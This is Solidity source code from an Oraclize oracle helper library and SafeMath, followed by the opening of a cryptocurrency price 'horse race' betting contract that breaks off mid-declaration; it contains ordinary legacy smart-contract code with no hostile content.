oraclize.getPrice(datasource);        if (price > 1 ether + tx.gasprice*200000) return 0; // unexpectedly high price        return oraclize.query.value(price)(timestamp, datasource, arg);    }    function oraclize_query(uint timestamp, string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource, gaslimit);        if (price > 1 ether + tx.gasprice*gaslimit) return 0; // unexpectedly high price        return oraclize.query_withGasLimit.value(price)(timestamp, datasource, arg, gaslimit);    }    function oraclize_query(string datasource, string arg, uint gaslimit) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource, gaslimit);        if (price > 1 ether + tx.gasprice*gaslimit) return 0; // unexpectedly high price        return oraclize.query_withGasLimit.value(price)(0, datasource, arg, gaslimit);    }    function oraclize_query(string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource);        if (price > 1 ether + tx.gasprice*200000) return 0; // unexpectedly high price        return oraclize.query2.value(price)(0, datasource, arg1, arg2);    }    function oraclize_query(uint timestamp, string datasource, string arg1, string arg2) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource);        if (price > 1 ether + tx.gasprice*200000) return 0; // unexpectedly high price        return oraclize.query2.value(price)(timestamp, datasource, arg1, arg2);    }    function oraclize_query(uint timestamp, string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource, gaslimit);        if (price > 1 ether + tx.gasprice*gaslimit) return 0; // unexpectedly high price        return oraclize.query2_withGasLimit.value(price)(timestamp, datasource, arg1, arg2, gaslimit);    }    function oraclize_query(string datasource, string arg1, string arg2, uint gaslimit) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource, gaslimit);        if (price > 1 ether + tx.gasprice*gaslimit) return 0; // unexpectedly high price        return oraclize.query2_withGasLimit.value(price)(0, datasource, arg1, arg2, gaslimit);    }    function oraclize_query(string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource);        if (price > 1 ether + tx.gasprice*200000) return 0; // unexpectedly high price        bytes memory args = stra2cbor(argN);        return oraclize.queryN.value(price)(0, datasource, args);    }    function oraclize_query(uint timestamp, string datasource, string[] argN) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource);        if (price > 1 ether + tx.gasprice*200000) return 0; // unexpectedly high price        bytes memory args = stra2cbor(argN);        return oraclize.queryN.value(price)(timestamp, datasource, args);    }    function oraclize_query(uint timestamp, string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource, gaslimit);        if (price > 1 ether + tx.gasprice*gaslimit) return 0; // unexpectedly high price        bytes memory args = stra2cbor(argN);        return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);    }    function oraclize_query(string datasource, string[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource, gaslimit);        if (price > 1 ether + tx.gasprice*gaslimit) return 0; // unexpectedly high price        bytes memory args = stra2cbor(argN);        return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);    }    function oraclize_query(string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](1);        dynargs[0] = args[0];        return oraclize_query(datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, string[1] args) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](1);        dynargs[0] = args[0];        return oraclize_query(timestamp, datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](1);        dynargs[0] = args[0];        return oraclize_query(timestamp, datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, string[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](1);        dynargs[0] = args[0];               return oraclize_query(datasource, dynargs, gaslimit);    }        function oraclize_query(string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](2);        dynargs[0] = args[0];        dynargs[1] = args[1];        return oraclize_query(datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, string[2] args) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](2);        dynargs[0] = args[0];        dynargs[1] = args[1];        return oraclize_query(timestamp, datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](2);        dynargs[0] = args[0];        dynargs[1] = args[1];        return oraclize_query(timestamp, datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, string[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](2);        dynargs[0] = args[0];        dynargs[1] = args[1];        return oraclize_query(datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](3);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        return oraclize_query(datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, string[3] args) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](3);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        return oraclize_query(timestamp, datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](3);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        return oraclize_query(timestamp, datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, string[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](3);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        return oraclize_query(datasource, dynargs, gaslimit);    }        function oraclize_query(string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](4);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        return oraclize_query(datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, string[4] args) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](4);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        return oraclize_query(timestamp, datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](4);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        return oraclize_query(timestamp, datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, string[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](4);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        return oraclize_query(datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](5);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        dynargs[4] = args[4];        return oraclize_query(datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, string[5] args) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](5);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        dynargs[4] = args[4];        return oraclize_query(timestamp, datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](5);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        dynargs[4] = args[4];        return oraclize_query(timestamp, datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, string[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        string[] memory dynargs = new string[](5);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        dynargs[4] = args[4];        return oraclize_query(datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource);        if (price > 1 ether + tx.gasprice*200000) return 0; // unexpectedly high price        bytes memory args = ba2cbor(argN);        return oraclize.queryN.value(price)(0, datasource, args);    }    function oraclize_query(uint timestamp, string datasource, bytes[] argN) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource);        if (price > 1 ether + tx.gasprice*200000) return 0; // unexpectedly high price        bytes memory args = ba2cbor(argN);        return oraclize.queryN.value(price)(timestamp, datasource, args);    }    function oraclize_query(uint timestamp, string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource, gaslimit);        if (price > 1 ether + tx.gasprice*gaslimit) return 0; // unexpectedly high price        bytes memory args = ba2cbor(argN);        return oraclize.queryN_withGasLimit.value(price)(timestamp, datasource, args, gaslimit);    }    function oraclize_query(string datasource, bytes[] argN, uint gaslimit) oraclizeAPI internal returns (bytes32 id){        uint price = oraclize.getPrice(datasource, gaslimit);        if (price > 1 ether + tx.gasprice*gaslimit) return 0; // unexpectedly high price        bytes memory args = ba2cbor(argN);        return oraclize.queryN_withGasLimit.value(price)(0, datasource, args, gaslimit);    }    function oraclize_query(string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](1);        dynargs[0] = args[0];        return oraclize_query(datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, bytes[1] args) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](1);        dynargs[0] = args[0];        return oraclize_query(timestamp, datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](1);        dynargs[0] = args[0];        return oraclize_query(timestamp, datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, bytes[1] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](1);        dynargs[0] = args[0];               return oraclize_query(datasource, dynargs, gaslimit);    }        function oraclize_query(string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](2);        dynargs[0] = args[0];        dynargs[1] = args[1];        return oraclize_query(datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, bytes[2] args) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](2);        dynargs[0] = args[0];        dynargs[1] = args[1];        return oraclize_query(timestamp, datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](2);        dynargs[0] = args[0];        dynargs[1] = args[1];        return oraclize_query(timestamp, datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, bytes[2] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](2);        dynargs[0] = args[0];        dynargs[1] = args[1];        return oraclize_query(datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](3);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        return oraclize_query(datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, bytes[3] args) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](3);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        return oraclize_query(timestamp, datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](3);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        return oraclize_query(timestamp, datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, bytes[3] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](3);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        return oraclize_query(datasource, dynargs, gaslimit);    }        function oraclize_query(string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](4);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        return oraclize_query(datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, bytes[4] args) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](4);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        return oraclize_query(timestamp, datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](4);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        return oraclize_query(timestamp, datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, bytes[4] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](4);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        return oraclize_query(datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](5);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        dynargs[4] = args[4];        return oraclize_query(datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, bytes[5] args) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](5);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        dynargs[4] = args[4];        return oraclize_query(timestamp, datasource, dynargs);    }    function oraclize_query(uint timestamp, string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](5);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        dynargs[4] = args[4];        return oraclize_query(timestamp, datasource, dynargs, gaslimit);    }    function oraclize_query(string datasource, bytes[5] args, uint gaslimit) oraclizeAPI internal returns (bytes32 id) {        bytes[] memory dynargs = new bytes[](5);        dynargs[0] = args[0];        dynargs[1] = args[1];        dynargs[2] = args[2];        dynargs[3] = args[3];        dynargs[4] = args[4];        return oraclize_query(datasource, dynargs, gaslimit);    }    function oraclize_cbAddress() oraclizeAPI internal returns (address){        return oraclize.cbAddress();    }    function oraclize_setProof(byte proofP) oraclizeAPI internal {        return oraclize.setProofType(proofP);    }    function oraclize_setCustomGasPrice(uint gasPrice) oraclizeAPI internal {        return oraclize.setCustomGasPrice(gasPrice);    }    function oraclize_setConfig(bytes32 config) oraclizeAPI internal {        return oraclize.setConfig(config);    }        function oraclize_randomDS_getSessionPubKeyHash() oraclizeAPI internal returns (bytes32){        return oraclize.randomDS_getSessionPubKeyHash();    }    function getCodeSize(address _addr) constant internal returns(uint _size) {        assembly {            _size := extcodesize(_addr)        }    }    function parseAddr(string _a) internal returns (address){        bytes memory tmp = bytes(_a);        uint160 iaddr = 0;        uint160 b1;        uint160 b2;        for (uint i=2; i<2+2*20; i+=2){            iaddr *= 256;            b1 = uint160(tmp[i]);            b2 = uint160(tmp[i+1]);            if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;            else if ((b1 >= 65)&&(b1 <= 70)) b1 -= 55;            else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;            if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;            else if ((b2 >= 65)&&(b2 <= 70)) b2 -= 55;            else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;            iaddr += (b1*16+b2);        }        return address(iaddr);    }    function strCompare(string _a, string _b) internal returns (int) {        bytes memory a = bytes(_a);        bytes memory b = bytes(_b);        uint minLength = a.length;        if (b.length < minLength) minLength = b.length;        for (uint i = 0; i < minLength; i ++)            if (a[i] < b[i])                return -1;            else if (a[i] > b[i])                return 1;        if (a.length < b.length)            return -1;        else if (a.length > b.length)            return 1;        else            return 0;    }    function indexOf(string _haystack, string _needle) internal returns (int) {        bytes memory h = bytes(_haystack);        bytes memory n = bytes(_needle);        if(h.length < 1 || n.length < 1 || (n.length > h.length))            return -1;        else if(h.length > (2**128 -1))            return -1;        else        {            uint subindex = 0;            for (uint i = 0; i < h.length; i ++)            {                if (h[i] == n[0])                {                    subindex = 1;                    while(subindex < n.length && (i + subindex) < h.length && h[i + subindex] == n[subindex])                    {                        subindex++;                    }                    if(subindex == n.length)                        return int(i);                }            }            return -1;        }    }    function strConcat(string _a, string _b, string _c, string _d, string _e) internal returns (string) {        bytes memory _ba = bytes(_a);        bytes memory _bb = bytes(_b);        bytes memory _bc = bytes(_c);        bytes memory _bd = bytes(_d);        bytes memory _be = bytes(_e);        string memory abcde = new string(_ba.length + _bb.length + _bc.length + _bd.length + _be.length);        bytes memory babcde = bytes(abcde);        uint k = 0;        for (uint i = 0; i < _ba.length; i++) babcde[k++] = _ba[i];        for (i = 0; i < _bb.length; i++) babcde[k++] = _bb[i];        for (i = 0; i < _bc.length; i++) babcde[k++] = _bc[i];        for (i = 0; i < _bd.length; i++) babcde[k++] = _bd[i];        for (i = 0; i < _be.length; i++) babcde[k++] = _be[i];        return string(babcde);    }    function strConcat(string _a, string _b, string _c, string _d) internal returns (string) {        return strConcat(_a, _b, _c, _d, "");    }    function strConcat(string _a, string _b, string _c) internal returns (string) {        return strConcat(_a, _b, _c, "", "");    }    function strConcat(string _a, string _b) internal returns (string) {        return strConcat(_a, _b, "", "", "");    }    function parseInt(string _a) internal returns (uint) {        return parseInt(_a, 0);    }    function parseInt(string _a, uint _b) internal returns (uint) {        bytes memory bresult = bytes(_a);        uint mint = 0;        bool decimals = false;        for (uint i=0; i<bresult.length; i++){            if ((bresult[i] >= 48)&&(bresult[i] <= 57)){                if (decimals){                   if (_b == 0) break;                    else _b--;                }                mint *= 10;                mint += uint(bresult[i]) - 48;            } else if (bresult[i] == 46) decimals = true;        }        if (_b > 0) mint *= 10**_b;        return mint;    }    function uint2str(uint i) internal returns (string){        if (i == 0) return "0";        uint j = i;        uint len;        while (j != 0){            len++;            j /= 10;        }        bytes memory bstr = new bytes(len);        uint k = len - 1;        while (i != 0){            bstr[k--] = byte(48 + i % 10);            i /= 10;        }        return string(bstr);    }        function stra2cbor(string[] arr) internal returns (bytes) {            uint arrlen = arr.length;            uint outputlen = 0;            bytes[] memory elemArray = new bytes[](arrlen);            for (uint i = 0; i < arrlen; i++) {                elemArray[i] = (bytes(arr[i]));                outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3; //+3 accounts for paired identifier types            }            uint ctr = 0;            uint cborlen = arrlen + 0x80;            outputlen += byte(cborlen).length;            bytes memory res = new bytes(outputlen);            while (byte(cborlen).length > ctr) {                res[ctr] = byte(cborlen)[ctr];                ctr++;            }            for (i = 0; i < arrlen; i++) {                res[ctr] = 0x5F;                ctr++;                for (uint x = 0; x < elemArray[i].length; x++) {                    if (x % 23 == 0) {                        uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;                        elemcborlen += 0x40;                        uint lctr = ctr;                        while (byte(elemcborlen).length > ctr - lctr) {                            res[ctr] = byte(elemcborlen)[ctr - lctr];                            ctr++;                        }                    }                    res[ctr] = elemArray[i][x];                    ctr++;                }                res[ctr] = 0xFF;                ctr++;            }            return res;        }    function ba2cbor(bytes[] arr) internal returns (bytes) {            uint arrlen = arr.length;            uint outputlen = 0;            bytes[] memory elemArray = new bytes[](arrlen);            for (uint i = 0; i < arrlen; i++) {                elemArray[i] = (bytes(arr[i]));                outputlen += elemArray[i].length + (elemArray[i].length - 1)/23 + 3; //+3 accounts for paired identifier types            }            uint ctr = 0;            uint cborlen = arrlen + 0x80;            outputlen += byte(cborlen).length;            bytes memory res = new bytes(outputlen);            while (byte(cborlen).length > ctr) {                res[ctr] = byte(cborlen)[ctr];                ctr++;            }            for (i = 0; i < arrlen; i++) {                res[ctr] = 0x5F;                ctr++;                for (uint x = 0; x < elemArray[i].length; x++) {                    if (x % 23 == 0) {                        uint elemcborlen = elemArray[i].length - x >= 24 ? 23 : elemArray[i].length - x;                        elemcborlen += 0x40;                        uint lctr = ctr;                        while (byte(elemcborlen).length > ctr - lctr) {                            res[ctr] = byte(elemcborlen)[ctr - lctr];                            ctr++;                        }                    }                    res[ctr] = elemArray[i][x];                    ctr++;                }                res[ctr] = 0xFF;                ctr++;            }            return res;        }                    string oraclize_network_name;    function oraclize_setNetworkName(string _network_name) internal {        oraclize_network_name = _network_name;    }        function oraclize_getNetworkName() internal returns (string) {        return oraclize_network_name;    }        function oraclize_newRandomDSQuery(uint _delay, uint _nbytes, uint _customGasLimit) internal returns (bytes32){        if ((_nbytes == 0)||(_nbytes > 32)) throw;        bytes memory nbytes = new bytes(1);        nbytes[0] = byte(_nbytes);        bytes memory unonce = new bytes(32);        bytes memory sessionKeyHash = new bytes(32);        bytes32 sessionKeyHash_bytes32 = oraclize_randomDS_getSessionPubKeyHash();        assembly {            mstore(unonce, 0x20)            mstore(add(unonce, 0x20), xor(blockhash(sub(number, 1)), xor(coinbase, timestamp)))            mstore(sessionKeyHash, 0x20)            mstore(add(sessionKeyHash, 0x20), sessionKeyHash_bytes32)        }        bytes[3] memory args = [unonce, nbytes, sessionKeyHash];         bytes32 queryId = oraclize_query(_delay, "random", args, _customGasLimit);        oraclize_randomDS_setCommitment(queryId, sha3(bytes8(_delay), args[1], sha256(args[0]), args[2]));        return queryId;    }        function oraclize_randomDS_setCommitment(bytes32 queryId, bytes32 commitment) internal {        oraclize_randomDS_args[queryId] = commitment;    }        mapping(bytes32=>bytes32) oraclize_randomDS_args;    mapping(bytes32=>bool) oraclize_randomDS_sessionKeysHashVerified;    function verifySig(bytes32 tosignh, bytes dersig, bytes pubkey) internal returns (bool){        bool sigok;        address signer;                bytes32 sigr;        bytes32 sigs;                bytes memory sigr_ = new bytes(32);        uint offset = 4+(uint(dersig[3]) - 0x20);        sigr_ = copyBytes(dersig, offset, 32, sigr_, 0);        bytes memory sigs_ = new bytes(32);        offset += 32 + 2;        sigs_ = copyBytes(dersig, offset+(uint(dersig[offset-1]) - 0x20), 32, sigs_, 0);        assembly {            sigr := mload(add(sigr_, 32))            sigs := mload(add(sigs_, 32))        }                        (sigok, signer) = safer_ecrecover(tosignh, 27, sigr, sigs);        if (address(sha3(pubkey)) == signer) return true;        else {            (sigok, signer) = safer_ecrecover(tosignh, 28, sigr, sigs);            return (address(sha3(pubkey)) == signer);        }    }    function oraclize_randomDS_proofVerify__sessionKeyValidity(bytes proof, uint sig2offset) internal returns (bool) {        bool sigok;                bytes memory sig2 = new bytes(uint(proof[sig2offset+1])+2);        copyBytes(proof, sig2offset, sig2.length, sig2, 0);                bytes memory appkey1_pubkey = new bytes(64);        copyBytes(proof, 3+1, 64, appkey1_pubkey, 0);                bytes memory tosign2 = new bytes(1+65+32);        tosign2[0] = 1; //role        copyBytes(proof, sig2offset-65, 65, tosign2, 1);        bytes memory CODEHASH = hex"fd94fa71bc0ba10d39d464d0d8f465efeef0a2764e3887fcc9df41ded20f505c";        copyBytes(CODEHASH, 0, 32, tosign2, 1+65);        sigok = verifySig(sha256(tosign2), sig2, appkey1_pubkey);                if (sigok == false) return false;                        bytes memory LEDGERKEY = hex"7fb956469c5c9b89840d55b43537e66a98dd4811ea0a27224272c2e5622911e8537a2f8e86a46baec82864e98dd01e9ccc2f8bc5dfc9cbe5a91a290498dd96e4";                bytes memory tosign3 = new bytes(1+65);        tosign3[0] = 0xFE;        copyBytes(proof, 3, 65, tosign3, 1);                bytes memory sig3 = new bytes(uint(proof[3+65+1])+2);        copyBytes(proof, 3+65, sig3.length, sig3, 0);                sigok = verifySig(sha256(tosign3), sig3, LEDGERKEY);                return sigok;    }        modifier oraclize_randomDS_proofVerify(bytes32 _queryId, string _result, bytes _proof) {        if ((_proof[0] != "L")||(_proof[1] != "P")||(_proof[2] != 1)) throw;                bool proofVerified = oraclize_randomDS_proofVerify__main(_proof, _queryId, bytes(_result), oraclize_getNetworkName());        if (proofVerified == false) throw;                _;    }        function matchBytes32Prefix(bytes32 content, bytes prefix) internal returns (bool){        bool match_ = true;                for (var i=0; i<prefix.length; i++){            if (content[i] != prefix[i]) match_ = false;        }                return match_;    }    function oraclize_randomDS_proofVerify__main(bytes proof, bytes32 queryId, bytes result, string context_name) internal returns (bool){        bool checkok;                        uint ledgerProofLength = 3+65+(uint(proof[3+65+1])+2)+32;        bytes memory keyhash = new bytes(32);        copyBytes(proof, ledgerProofLength, 32, keyhash, 0);        checkok = (sha3(keyhash) == sha3(sha256(context_name, queryId)));        if (checkok == false) return false;                bytes memory sig1 = new bytes(uint(proof[ledgerProofLength+(32+8+1+32)+1])+2);        copyBytes(proof, ledgerProofLength+(32+8+1+32), sig1.length, sig1, 0);                        checkok = matchBytes32Prefix(sha256(sig1), result);        if (checkok == false) return false;                        bytes memory commitmentSlice1 = new bytes(8+1+32);        copyBytes(proof, ledgerProofLength+32, 8+1+32, commitmentSlice1, 0);                bytes memory sessionPubkey = new bytes(64);        uint sig2offset = ledgerProofLength+32+(8+1+32)+sig1.length+65;        copyBytes(proof, sig2offset-64, 64, sessionPubkey, 0);                bytes32 sessionPubkeyHash = sha256(sessionPubkey);        if (oraclize_randomDS_args[queryId] == sha3(commitmentSlice1, sessionPubkeyHash)){ //unonce, nbytes and sessionKeyHash match            delete oraclize_randomDS_args[queryId];        } else return false;                        bytes memory tosign1 = new bytes(32+8+1+32);        copyBytes(proof, ledgerProofLength, 32+8+1+32, tosign1, 0);        checkok = verifySig(sha256(tosign1), sig1, sessionPubkey);        if (checkok == false) return false;                if (oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] == false){            oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash] = oraclize_randomDS_proofVerify__sessionKeyValidity(proof, sig2offset);        }                return oraclize_randomDS_sessionKeysHashVerified[sessionPubkeyHash];    }        function copyBytes(bytes from, uint fromOffset, uint length, bytes to, uint toOffset) internal returns (bytes) {        uint minLength = length + toOffset;        if (to.length < minLength) {            throw; // Should be a better way?        }        uint i = 32 + fromOffset;        uint j = 32 + toOffset;        while (i < (32 + fromOffset + length)) {            assembly {                let tmp := mload(add(from, i))                mstore(add(to, j), tmp)            }            i += 32;            j += 32;        }        return to;    }        function safer_ecrecover(bytes32 hash, uint8 v, bytes32 r, bytes32 s) internal returns (bool, address) {        bool ret;        address addr;        assembly {            let size := mload(0x40)            mstore(size, hash)            mstore(add(size, 32), v)            mstore(add(size, 64), r)            mstore(add(size, 96), s)            ret := call(3000, 1, 0, size, 128, size, 32)            addr := mload(size)        }          return (ret, addr);    }    function ecrecovery(bytes32 hash, bytes sig) internal returns (bool, address) {        bytes32 r;        bytes32 s;        uint8 v;        if (sig.length != 65)          return (false, 0);        assembly {            r := mload(add(sig, 32))            s := mload(add(sig, 64))            v := byte(0, mload(add(sig, 96)))        }        if (v < 27)          v += 27;        if (v != 27 && v != 28)            return (false, 0);        return safer_ecrecover(hash, v, r, s);    }        }library SafeMath {  function mul(uint256 a, uint256 b) internal constant returns (uint256) {    uint256 c = a * b;    assert(a == 0 || c / a == b);    return c;  }  function div(uint256 a, uint256 b) internal constant returns (uint256) {    uint256 c = a / b;    return c;  }  function sub(uint256 a, uint256 b) internal constant returns (uint256) {    assert(b <= a);    return a - b;  }  function add(uint256 a, uint256 b) internal constant returns (uint256) {    uint256 c = a + b;    assert(c >= a);    return c;  }}
0<CODESPLIT>contract BettingControllerInterface {    function remoteBettingClose() external;    function depositHouseTakeout() external payable;}contract Betting is usingOraclize {    using SafeMath for uint256; //using safemath    uint countdown=3; // variable to check if all prices are received    address public owner; //owner address        uint public winnerPoolTotal;    string public constant version = "0.2.2";        BettingControllerInterface internal bettingControllerInstance;        struct chronus_info {        bool  betting_open; // boolean: check if betting is open        bool  race_start; //boolean: check if race has started        bool  race_end; //boolean: check if race has ended        bool  voided_bet; //boolean: check if race has been voided        uint32  starting_time; // timestamp of when the race starts        uint32  betting_duration;        uint32  race_duration; // duration of the race        uint32 voided_timestamp;    }        struct horses_info{        int64  BTC_delta; //horses.BTC delta value        int64  ETH_delta; //horses.ETH delta value        int64  LTC_delta; //horses.LTC delta value        bytes32 BTC; //32-bytes equivalent of horses.BTC        bytes32 ETH; //32-bytes equivalent of horses.ETH        bytes32 LTC;  //32-bytes equivalent of horses.LTC        uint customPreGasLimit;        uint customPostGasLimit;    }    struct bet_info{        bytes32 horse; // coin on which amount is bet on        uint amount; // amount bet by Bettor    }    struct coin_info{        uint256 pre; // locking price        uint256 post; // ending price        uint160 total; // total coin pool        uint32 count; // number of bets        bool price_check;        bytes32 preOraclizeId;        bytes32 postOraclizeId;    }    struct voter_info {        uint160 total_bet; //total amount of bet placed        bool rewarded; // boolean: check for double spending        mapping(bytes32=>uint) bets; //array of bets    }        mapping (bytes32 => bytes32) oraclizeIndex; // mapping oraclize IDs with coins    mapping (bytes32 => coin_info) coinIndex; // mapping coins with pool information    mapping (address => voter_info) 